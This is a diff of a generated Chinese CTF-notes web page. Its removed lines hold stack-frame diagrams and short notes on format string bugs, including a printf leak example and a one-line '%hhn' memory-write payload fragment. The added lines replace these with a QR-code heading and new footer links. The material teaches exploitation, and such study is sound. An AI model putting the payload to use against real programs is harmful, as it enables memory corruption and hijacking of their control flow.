-</span><span id="__span-3-12"><a id="__codelineno-3-12" name="__codelineno-3-12" href="#__codelineno-3-12"></a>0x00000004 =&gt; | 12  34  56  78  |
-</span><span id="__span-3-13"><a id="__codelineno-3-13" name="__codelineno-3-13" href="#__codelineno-3-13"></a>              +-----------------+
-</span><span id="__span-3-14"><a id="__codelineno-3-14" name="__codelineno-3-14" href="#__codelineno-3-14"></a>Low           31-------&lt;&lt;-------0
-</span><span id="__span-3-15"><a id="__codelineno-3-15" name="__codelineno-3-15" href="#__codelineno-3-15"></a>Address
-</span></code></pre></div>
-</div>
-</div>
-</div>
-</details>
-<ul>
-<li>栈是从上到下增长的</li>
-<li>x86的函数参数储存在栈中，而x86-64前6个参数储存在寄存器中，剩下的储存在栈中</li>
-</ul>
-<details class="abstract" open="open">
-<summary>x86的栈结构</summary>
-<div class="tabbed-set tabbed-alternate" data-tabs="3:2"><input checked="checked" id="__tabbed_3_1" name="__tabbed_3" type="radio" /><input id="__tabbed_3_2" name="__tabbed_3" type="radio" /><div class="tabbed-labels"><label for="__tabbed_3_1">x86</label><label for="__tabbed_3_2">x86-64</label></div>
-<div class="tabbed-content">
-<div class="tabbed-block">
-<p><img alt="" src="x86-32stack.jpg" /></p>
-</div>
-<div class="tabbed-block"></div>
-</div>
-</div>
-</details>
-<!--     
-    === "x86"
-
-        <div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>High  Address | 32bit 4Byte     |
-</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>              +-----------------+
-</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>              |                 |
-</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a>              +-----------------+
-</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a>              | args #n         |
-</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a>ebp+4*(1+n) =&gt;+-----------------+
-</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a>              | ......          |
-</span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a>              +-----------------+
-</span><span id="__span-4-9"><a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a>              | args #2         |
-</span><span id="__span-4-10"><a id="__codelineno-4-10" name="__codelineno-4-10" href="#__codelineno-4-10"></a>              +-----------------+
-</span><span id="__span-4-11"><a id="__codelineno-4-11" name="__codelineno-4-11" href="#__codelineno-4-11"></a>              | args #1         |
-</span><span id="__span-4-12"><a id="__codelineno-4-12" name="__codelineno-4-12" href="#__codelineno-4-12"></a>      ebp+8 =&gt;+-----------------+
-</span><span id="__span-4-13"><a id="__codelineno-4-13" name="__codelineno-4-13" href="#__codelineno-4-13"></a>              | return address  |
-</span><span id="__span-4-14"><a id="__codelineno-4-14" name="__codelineno-4-14" href="#__codelineno-4-14"></a>      ebp+4 =&gt;+-----------------+
-</span><span id="__span-4-15"><a id="__codelineno-4-15" name="__codelineno-4-15" href="#__codelineno-4-15"></a>              | old ebp address |
-</span><span id="__span-4-16"><a id="__codelineno-4-16" name="__codelineno-4-16" href="#__codelineno-4-16"></a>      ebp   =&gt;+-----------------+
-</span><span id="__span-4-17"><a id="__codelineno-4-17" name="__codelineno-4-17" href="#__codelineno-4-17"></a>              | Callee saved reg|
-</span><span id="__span-4-18"><a id="__codelineno-4-18" name="__codelineno-4-18" href="#__codelineno-4-18"></a>      ebp-4 =&gt;+-----------------+
-</span><span id="__span-4-19"><a id="__codelineno-4-19" name="__codelineno-4-19" href="#__codelineno-4-19"></a>              | ...             |
-</span><span id="__span-4-20"><a id="__codelineno-4-20" name="__codelineno-4-20" href="#__codelineno-4-20"></a>      ebp-8 =&gt;+-----------------+
-</span><span id="__span-4-21"><a id="__codelineno-4-21" name="__codelineno-4-21" href="#__codelineno-4-21"></a>              | ...             |
-</span><span id="__span-4-22"><a id="__codelineno-4-22" name="__codelineno-4-22" href="#__codelineno-4-22"></a>              +-----------------+
-</span><span id="__span-4-23"><a id="__codelineno-4-23" name="__codelineno-4-23" href="#__codelineno-4-23"></a>              | return address  |
-</span><span id="__span-4-24"><a id="__codelineno-4-24" name="__codelineno-4-24" href="#__codelineno-4-24"></a>      esp =&gt;  +-----------------+
-</span><span id="__span-4-25"><a id="__codelineno-4-25" name="__codelineno-4-25" href="#__codelineno-4-25"></a>              | next stack frame|
-</span><span id="__span-4-26"><a id="__codelineno-4-26" name="__codelineno-4-26" href="#__codelineno-4-26"></a>              +-----------------+
-</span><span id="__span-4-27"><a id="__codelineno-4-27" name="__codelineno-4-27" href="#__codelineno-4-27"></a>              |                 |
-</span><span id="__span-4-28"><a id="__codelineno-4-28" name="__codelineno-4-28" href="#__codelineno-4-28"></a>Low  Address  31-------&lt;&lt;-------0
-</span></code></pre></div>
-
-    === "x86-64"
-
-        ```
-        High
-        Address | 64bit 8Byte                       |
-                +-----------------------------------+
-                | args                              |
-                +-----------------------------------+
-                | return address                    |
-                +-----------------------------------+
-        rbp =>  | old ebp                           |
-                +-----------------------------------+
-        rbp-8 =>|                                   |
-                +-----------------------------------+
-                | local variables                   |
-        Low     63----------------<<----------------0
-        Address
-        ``` -->
-
-<!-- ???+ bug "Format String Bug" -->
-<h3 id="format-string-bug">Format String Bug</h3>
-<ul>
-<li>全称格式化字符串漏洞</li>
-</ul>
-<h4 id="_1">内存泄露</h4>
-<ul>
-<li>以<code>printf()</code>为例</li>
-<li><code>%d</code> - 十进制 - 输出十进制整数</li>
-<li><code>%s</code> - 字符串 - 从内存中读取字符串</li>
-<li><code>%x</code> - 十六进制 - 输出十六进制数</li>
-<li><code>%c</code> - 字符 - 输出字符</li>
-<li><code>%p</code> - 指针 - 指针地址</li>
-<li><code>%n</code> - 到目前为止所写的字符数</li>
-<li><code>printf(s);  // s = "%x%x%x"</code>会泄露栈上的数据，相对于格式化字符串偏移的数据</li>
-</ul>
-<h4 id="_2">内存修改</h4>
-<ul>
-<li><code>payload = p32(addr) + b'%27d' + b'%4$hhn'</code>形如此类</li>
-</ul>
-<h4 id="got">got表攻击</h4>
-<h4 id="_3">返回地址攻击</h4>
+<h3 id="_2">二维码标准</h3>
 
 
 
@@ -2015,7 +1690,7 @@
       <nav class="md-footer__inner md-grid" aria-label="页脚" >
         
           
-          <a href="../reverse/unpack/" class="md-footer__link md-footer__link--prev" aria-label="上一页: 软件壳" rel="prev">
+          <a href="../escape/" class="md-footer__link md-footer__link--prev" aria-label="上一页: 沙箱逃逸" rel="prev">
             <div class="md-footer__button md-icon">
               
               <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
@@ -2025,20 +1700,20 @@
                 上一页
               </span>
               <div class="md-ellipsis">
-                软件壳
+                沙箱逃逸
               </div>
             </div>
           </a>
         
         
           
-          <a href="rop/" class="md-footer__link md-footer__link--next" aria-label="下一页: ROP" rel="next">
+          <a href="../../crypto/" class="md-footer__link md-footer__link--next" aria-label="下一页: Crypto" rel="next">
             <div class="md-footer__title">
               <span class="md-footer__direction">
                 下一页
               </span>
               <div class="md-ellipsis">
-                ROP
+                Crypto
               </div>
             </div>
             <div class="md-footer__button md-icon">
@@ -2112,12 +1787,12 @@
       <div class="md-dialog__inner md-typeset"></div>
     </div>
     
-    <script id="__config" type="application/json">{"base": "../..", "features": ["navigation.instant", "navigation.instant.prefetch", "navigation.tracking", "navigation.tabs", "navigation.path", "navigation.indexes", "navigation.top", "navigation.footer", "toc.follow", "content.code.copy", "content.code.select", "content.code.annotate", "content.tabs.link"], "search": "../../assets/javascripts/workers/search.dfff1995.min.js", "translations": {"clipboard.copied": "\u5df2\u590d\u5236", "clipboard.copy": "\u590d\u5236", "search.result.more.one": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.other": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 # \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.term.missing": "\u7f3a\u5c11", "select.version": "\u9009\u62e9\u5f53\u524d\u7248\u672c"}}</script>
+    <script id="__config" type="application/json">{"base": "../../..", "features": ["navigation.instant", "navigation.instant.prefetch", "navigation.tracking", "navigation.tabs", "navigation.path", "navigation.indexes", "navigation.top", "navigation.footer", "toc.follow", "content.code.copy", "content.code.select", "content.code.annotate", "content.tabs.link"], "search": "../../../assets/javascripts/workers/search.dfff1995.min.js", "translations": {"clipboard.copied": "\u5df2\u590d\u5236", "clipboard.copy": "\u590d\u5236", "search.result.more.one": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.other": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 # \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.term.missing": "\u7f3a\u5c11", "select.version": "\u9009\u62e9\u5f53\u524d\u7248\u672c"}}</script>
     
     
-      <script src="../../assets/javascripts/bundle.dff1b7c8.min.js"></script>
+      <script src="../../../assets/javascripts/bundle.dff1b7c8.min.js"></script>
       
-        <script src="../../javascripts/mathjax.js"></script>
+        <script src="../../../javascripts/mathjax.js"></script>
       
         <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
       
